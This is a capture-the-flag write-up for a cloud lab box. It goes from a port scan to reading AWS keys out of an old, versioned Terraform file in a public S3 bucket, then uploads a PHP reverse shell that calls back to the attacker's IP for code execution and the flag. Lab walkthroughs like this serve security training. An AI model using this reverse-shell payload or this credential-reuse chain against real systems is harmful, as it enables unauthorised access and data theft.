# [Cloud] Unveiled

An IP is given to start: scanning it reveals 2 ports open. HTTP and SSH.

```bash
└─$ nmap -A -T4 -Pn --top-ports 1000 10.129.253.206
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-14 09:05 EDT
Nmap scan report for 10.129.253.206
Host is up (0.0096s latency).
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open     http       Apache httpd 2.4.41
|_http-title: Travel to Planet Red
|_http-server-header: Apache/2.4.41
```

Visiting the website gives more information about an S3 bucket and hostname to be added in `/etc/hosts`

```bash
┌──(vagrant㉿kali)-[~]
└─$ curl 10.129.253.206
[...]
<script src="http://s3.unveiled.htb/unveiled-backups/main.js"/>
</body>
</html>
```

The bucket `unveiled-backups` being public, it is possible to read its content anonymously

```bash
$ aws s3 ls s3://unveiled-backups --endpoint http://s3.unveiled.htb
2023-07-14 22:09:01       4495 index.html
2023-07-14 22:09:02       1107 main.tf
```

There are few versions of the `main.tf` file

```bash
$ aws s3api list-object-versions --bucket unveiled-backups --key main.tf --endpoint http://s3.unveiled.htb
{
    "IsTruncated": false,
    "KeyMarker": "main.tf",
    "Versions": [
        {
            "ETag": "\"9c9e9d85b28ce6bbbba93e0860389c65\"",
            "Size": 1107,
            "StorageClass": "STANDARD",
            "Key": "main.tf",
            "VersionId": "a77c5ef7-4448-497c-b361-54ac3f7289b8",
            "IsLatest": true,
            "LastModified": "2023-07-14T14:09:02+00:00",
            "Owner": {
                "DisplayName": "webfile",
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }
        },
        {
            "ETag": "\"4947c773e44f5973a9c3d37f24cb8e63\"",
            "Size":
1167,
            "StorageClass": "STANDARD",
            "Key": "main.tf",
            "VersionId": "0b7866f9-7569-4f9d-8dc3-e99f6f4fed21",
            "IsLatest": false,
            "LastModified": "2023-07-14T14:09:01+00:00",
            "Owner": {
                "DisplayName": "webfile",
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }
        }
    ],
    "Name": "unveiled-backups",
    "Prefix": "",
    "Delimiter": "None",
    "MaxKeys": 1000
}
```

Downloading the most ancient one yields some credentials. It also shows the existance of a second bucket.

```bash
$ aws s3api get-object --bucket unveiled-backups --key main.tf --version-id 0b7866f9-7569-4f9d-8dc3-e99f6f4fed21 /dev/stdout --endpoint http://s3.unveiled.htb
variable "aws_access_key"{
  default = "AKIA6CFMOGFLAHOPQTMA"
}
variable "aws_secret_key"{
  default = "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"
}
provider "aws" {
  access_key=var.aws_access_key
  secret_key=var.aws_secret_key
}

resource "aws_s3_bucket" "unveiled-backups" {
  bucket = "unveiled-backups"
  acl    = "private"
  tags = {
    Name        = "S3 Bucket"
    Environment = "Prod"
  }
  versioning {
    enabled = true
  }
}

resource "aws_s3_bucket_acl" "bucket_acl" {
  bucket = aws_s3_bucket.unveiled-backups.id
  acl    = "public-read"
}

resource "aws_s3_bucket" "website-assets" {
  bucke
t = "website-assets"
  acl    = "private"
}
[...]
```

We can use those credentials to run authenticated S3 commands against the private bucket `website-assets`

```bash
$ export AWS_DEFAULT_REGION=us-east-2
$ export AWS_SECRET_ACCESS_KEY=tLK3S3CNsXfj0mjPsIH2iCh5odYHMPDwSVxn7CB5
$ export AWS_ACCESS_KEY_ID=AKIA6CFMOGFLAHOPQTMA
```

Since the webserver is running apache, we can assume it can run PHP code: let's try it with a reverse shell to our VPN IP called `cmd.php`

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.34/4444 0>&1'");
```

```bash
$ aws s3api put-object --bucket website-assets --key cmd.php --endpoint http://s3.unveiled.htb --body cmd.php
{
    "ETag": "\"511967f1c7a076275253d16e8ec19812\""
}
```

Visiting `http://unveiled.htb/cmd.php` triggers the reverse shell

```bash
$ nc -lvn 4444
bash: cannot set terminal process group (986): Inappropriate ioctl for device
bash: no job control in this shell
www-data@unveiled:/var/www/html$ ls
ls
404.html
background.jpg
cmd.php
index.html
```

The flag is located 1 folder above

```bash
www-data@unveiled:/var/www$ cat flag.txt
cat flag.txt
HTB{th3_r3d_pl4n3ts_cl0ud_h4s_f4ll3n}
```
